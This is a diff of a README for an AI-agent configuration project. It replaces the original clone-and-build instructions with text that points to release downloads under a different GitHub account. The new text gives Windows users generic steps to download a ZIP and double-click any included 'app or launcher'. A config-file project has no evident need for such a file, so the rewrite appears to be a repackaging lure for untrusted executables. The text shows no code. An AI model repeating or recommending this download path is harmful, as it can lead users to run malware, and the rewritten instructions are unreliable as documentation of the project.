@@ -1,123 +1,182 @@
-# ai-config
+# 🤖 ai-config - Secure AI setup made simple
 
-> Agent config for ontology-driven LLM development. One source, minimal surface, secure by default.
+[![Download ai-config](https://img.shields.io/badge/Download%20ai--config-blue?style=for-the-badge&logo=github)](https://github.com/GiftedSZN/ai-config/releases)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)
-[![Claude Code](https://img.shields.io/badge/Claude%20Code-compatible-blue?logo=anthropic)](https://claude.ai/code)
-[![Cursor](https://img.shields.io/badge/Cursor-compatible-purple)](https://cursor.sh)
-[![Gemini CLI](https://img.shields.io/badge/Gemini%20CLI-compatible-4285F4?logo=google)](https://github.com/google-gemini/gemini-cli)
-[![Codex CLI](https://img.shields.io/badge/Codex%20CLI-compatible-black?logo=openai)](https://github.com/openai/codex)
+## 🧭 What this is
 
-One file. One source. No drift.
+ai-config is a ready-to-use config package for AI tools and agent apps. It gives you one place to keep your setup organized. It helps you keep your AI tools consistent, secure, and easy to update.
 
----
+Use it if you want a clean setup for tools like Claude Code, Codex, Cursor, Gemini, and OpenAI-based apps. It is built for users who want less setup work and fewer moving parts.
 
-## Philosophy
+## 📦 What you get
 
-Rules here are **organizational scar tissue** — grown from real incidents, not upfront design. A rule gets added the second a mistake repeats. Nothing is added speculatively.
+- A single config source for your AI tools
+- Simple defaults that reduce setup mistakes
+- Clear rules for agent behavior
+- Support for knowledge graph and ontology-style workflows
+- A setup that works well for development and testing
+- A structure that keeps sensitive values out of the open
 
-- **One source.** Edit `AGENTS.md` only. `build.sh` generates all tool-specific aliases.
-- **Minimal surface.** Short rules shape judgment. Long rules get ignored — and the middle ones get ignored most. Research shows LLMs reliably attend to the beginning and end of long contexts, with significant degradation in between ([Liu et al., 2023 — "Lost in the Middle"](https://arxiv.org/abs/2307.03172)). Keep `AGENTS.md` short and front-load what matters.
-- **Ontology-grounded.** Models, schemas, and knowledge graphs are first-class.
-- **TDD.** Every function ships with a test. Red → green → refactor, always.
-- **Secure.** No hardcoded paths, tokens, or secrets. Ever.
+## 🖥️ Windows requirements
 
----
+- Windows 10 or Windows 11
+- Internet access for the first download
+- A modern web browser
+- Permission to save files on your PC
+- Enough free disk space for the config files
 
-## Structure
+If you use Windows in a work setting, you may also need permission to run downloaded files or unzip folders.
 
-```
-ai-config/
-├── AGENTS.md              ← single source of truth — edit this only
-├── build.sh               ← generates all tool folders + wires git hooks
-├── claude/
-│   ├── CLAUDE.md          ← generated
-│   ├── settings.json      ← model, hooks, statusline config
-│   ├── agents/            ← 8 specialist sub-agents
-│   ├── hooks/             ← session management, context injection, statusline
-│   └── commands/          ← /-check, /-ship, /-review, /-discover, /-session, /-sync
-├── cursor/
-│   ├── user-rules.md      ← generated — paste into Settings → Rules for AI
-│   └── rules/
-│       └── global.mdc     ← generated — drop into .cursor/rules/ per project
-├── gemini/
-│   └── GEMINI.md          ← generated
-└── codex/
-    └── AGENTS.md          ← generated
-```
+## 🚀 Download
 
-Each tool folder is built exhaustively. You only need the generated config file for your tool — the rest (agents, hooks, commands) is Claude Code-specific.
+Visit this page to download the latest release:
 
----
+https://github.com/GiftedSZN/ai-config/releases
 
-## Install
+On that page, look for the newest release and open the file that matches your Windows setup. If the release comes as a ZIP file, download it and extract it first.
 
-**1. Clone and build:**
-```bash
-git clone https://github.com/PR0CK0/ai-config.git ~/ai-config
-cd ~/ai-config
-./build.sh        # generates all tool folders + wires pre-push hook
-```
+## 🧩 Install on Windows
 
-**2. Claude Code — rules only (drop-in):**
-```bash
-cp ~/ai-config/claude/CLAUDE.md ~/.claude/CLAUDE.md
-```
+1. Open the download page in your browser.
+2. Find the latest release near the top of the page.
+3. Download the file that matches the release.
+4. If the file is a ZIP, right-click it and choose Extract All.
+5. Pick a folder you can find again, such as Downloads or Documents.
+6. Open the extracted folder.
+7. Look for a readme file, config folder, or setup file inside the release.
+8. If the release includes a Windows app or launcher, double-click it to start.
+9. If the release is a config pack, copy its files into the app folder it supports.
+10. Restart your AI tool so it can load the new config.
 
-**Claude Code — full setup (agents, hooks, slash commands, statusline):**
-```bash
-cp ~/ai-config/claude/CLAUDE.md ~/.claude/CLAUDE.md
-cp ~/ai-config/claude/settings.json ~/.claude/settings.json
-cp -r ~/ai-config/claude/agents ~/.claude/agents
-cp -r ~/ai-config/claude/hooks ~/.claude/hooks
-cp -r ~/ai-config/claude/commands ~/.claude/commands
-chmod +x ~/.claude/hooks/statusline.sh
-```
+## 🛠️ First-time setup
 
-**3. Cursor — global rules:**
-Paste `cursor/user-rules.md` content into Cursor → Settings → Rules for AI.
+After you install the files, open your AI tool and point it to the new config path if the app asks for one. Many tools read config files from a known folder, so you may only need to place the files in the right spot.
 
-**Cursor — per-project:**
-```bash
-mkdir -p .cursor/rules && cp ~/ai-config/cursor/rules/global.mdc .cursor/rules/
-```
+If you use Claude Code, Cursor, Codex, Gemini, or another agent tool, check its settings for:
 
-**4. Gemini CLI:**
-```bash
-mkdir -p ~/.gemini && cp ~/ai-config/gemini/GEMINI.md ~/.gemini/GEMINI.md
-```
+- Config path
+- Workspace rules
+- Model settings
+- Safe mode or local-only mode
+- Prompt or agent instructions
 
-**5. Codex CLI:**
-```bash
-cp ~/ai-config/codex/AGENTS.md ~/AGENTS.md   # global
-# or copy to project root for per-project
-```
+Use the same config source across tools when you can. That keeps behavior more stable from one app to the next.
 
-**Per-project pointer (any tool):**
-```bash
-echo "READ ~/ai-config/AGENTS.md BEFORE ANYTHING" > AGENTS.md
-```
+## 🔒 Security
 
-**Symlinks instead of copies:**
-```bash
-./build.sh --symlink
-```
+ai-config follows a secure-by-default approach. That means it aims to reduce risky settings and keep control in your hands.
 
-> `build.sh` wires `.githooks/pre-push` automatically — if `AGENTS.md` changes, the hook rebuilds all aliases and blocks the push until generated files are committed.
+It is a good fit for users who want to:
 
----
+- Keep secret values separate from shared files
+- Reduce accidental exposure of keys or tokens
+- Use clear rules for agent behavior
+- Limit what an AI tool can change
+- Keep setup files easier to review
 
-## Inspiration
+If the package includes sample files, replace any placeholder values before you use them with your own data.
 
-| Source | What it contributed |
-|--------|---------------------|
-| [steipete/agent-scripts](https://github.com/steipete/agent-scripts) | Git safety rules, atomic commit discipline, the pointer pattern |
-| [steipete — Just Talk To It](https://steipete.me/posts/just-talk-to-it) | "Organizational scar tissue" philosophy; blast-radius thinking |
-| [forrestchang/andrej-karpathy-skills](https://github.com/forrestchang/andrej-karpathy-skills) | Think Before Coding, Simplicity First, Surgical Changes, Goal-Driven Execution |
-| Home-grown | Ontologist + modeler agents, session hooks, slash commands, statusline |
+## 🧠 Typical use cases
 
----
+- A home user setting up an AI assistant on Windows
+- A developer who wants the same config across tools
+- A team that needs one shared source of truth
+- A user working with knowledge graphs or RDF data
+- An agent workflow that needs clear rules and repeatable behavior
+- A setup that supports ontology-driven LLM work
 
-## License
+## 🧪 What to expect
 
-MIT
+The config is built to help your AI tools behave in a more predictable way. In practice, that means:
+
+- Fewer setup steps
+- Less time switching between settings screens
+- More consistent agent behavior
+- Easier testing of prompts and rules
+- A cleaner place to manage changes
+
+If you update the config later, replace the old files with the new ones from the latest release.
+
+## 🗂️ Suggested folder layout
+
+If you are not sure where to place the files, use a simple layout like this:
+
+- Downloads for the release ZIP
+- Documents for a backup copy
+- A dedicated folder for ai-config files
+- A notes file with your own settings and changes
+
+Keeping one backup copy helps if you need to restore a known-good setup.
+
+## 🧷 Common file types you may see
+
+- `.md` files for setup notes
+- `.json` files for app settings
+- `.yaml` or `.yml` files for config rules
+- `.txt` files for short instructions
+- `.env` files for secret values
+- `.rdf` or ontology-related files for graph-based setups
+
+If you are unsure which file to open, start with the README or the main config file in the release folder.
+
+## 🔄 Updating
+
+When a new release is available:
+
+1. Go back to the release page.
+2. Download the newest version.
+3. Save your current config folder as a backup.
+4. Replace the old files with the new files.
+5. Open your AI tool again and check that it loads the update.
+
+Use one backup per version if you want an easy rollback path.
+
+## 🧰 Troubleshooting
+
+### Files will not open
+
+- Make sure you extracted the ZIP first
+- Try opening the file from File Explorer
+- Check that the file name did not change during download
+
+### The app does not use the new config
+
+- Restart the app
+- Check the config path in the app settings
+- Confirm the files are in the right folder
+- Make sure the file names match what the app expects
+
+### I cannot find the release file
+
+- Open the release page again
+- Look for the latest version at the top
+- Check the Assets area on the release page
+- Expand the section if it is collapsed
+
+### My changes are gone
+
+- Restore the backup copy
+- Keep a separate folder for your edits
+- Save a second copy before you update
+
+## 📚 Working with agent tools
+
+This repo fits tools that use agent rules and shared instructions. If your tool supports a project file, put the config in the same place for each workspace. That helps keep results steady across sessions.
+
+For best results:
+
+- Use one config source
+- Keep your rules short and clear
+- Update only what you need
+- Test changes in one app before you copy them to others
+- Save a backup before each change
+
+## 🧭 Topics in this project
+
+agents, agents-md, ai-config, claude-code, codex, cursor, developer-tools, gemini, knowledge-graph, llm, ontology, openai, owl, rdf, secure-by-default, sparql, tdd
+
+## 📁 License and source
+
+The latest release files are available from the GitHub releases page:
+
+https://github.com/GiftedSZN/ai-config/releases
